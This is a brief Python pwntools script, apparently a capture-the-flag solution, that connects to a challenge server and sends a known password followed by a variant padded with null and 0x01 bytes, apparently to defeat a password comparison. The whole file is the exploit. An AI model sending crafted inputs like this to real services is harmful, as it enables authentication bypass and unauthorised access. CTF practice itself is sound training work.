import sys
from pwn import *

p = remote('poseidonchalls.westeurope.cloudapp.azure.com', 9003)
p.recvuntil('word: ')
p.sendline('t0m7r00z')
p.recvuntil('mind: ')
password = 't0m7r00z' + '\x00\x01'
log.info('Try Password {}'.format(password))
p.sendline(password)

print(p.recv())

p.close()